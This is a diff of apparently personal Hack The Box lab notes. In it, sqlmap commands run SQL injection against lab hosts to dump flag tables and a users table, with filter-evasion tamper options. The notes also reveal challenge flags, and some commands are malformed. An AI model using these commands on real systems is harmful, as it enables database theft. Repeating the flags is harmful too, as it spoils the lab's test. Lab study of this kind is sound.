@@ -8,7 +8,7 @@ sqlmap -u 94.237.49.212:33817/case2.php --cookie='id=1*' --dump --batch -T flag3
 # HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
 
 # What's the contents of table flag4 (Case #4)
-# sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
+sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
 # HTB{j450n_v00rh335_53nd5_6r475}
 ```
 
@@ -19,11 +19,22 @@ sqlmap -u 94.237.49.212:33817/case1.php/ -D testdb -T flag1 --batch --dump --cra
 
 ```bash
 # What's the name of the column containing "style" in it's name (Case #1)
-# sqlmap -u 94.237.49.212:33817/?id=1" --schema
-sqlmap -u 94.237.49.212:33817/case1?id=1" --search -C style --random-agent
+# sqlmap -u 94.237.63.201:36417/?id=1" --schema
+sqlmap -u "94.237.63.201:36417/case1?id=1" --search -C style --random-agent --tamper=space2comment
 
 # What's the Kimberly user's password? (Case #1)
-sqlmap -u 94.237.49.212:33817/?id=1" --dump -D -T users
+sqlmap -u 94.237.63.201:36417/?id=1" --dump -D -T users
+```
+
+```bash
+# What's the contents of table flag8? (Case #8)
+
+# What's the contents of table flag9? (Case #9)
+
+# What's the contents of table flag10? (Case #10)
+
+# What's the contents of table flag11? (Case #11)
+ 
 ```
 
 ```bash
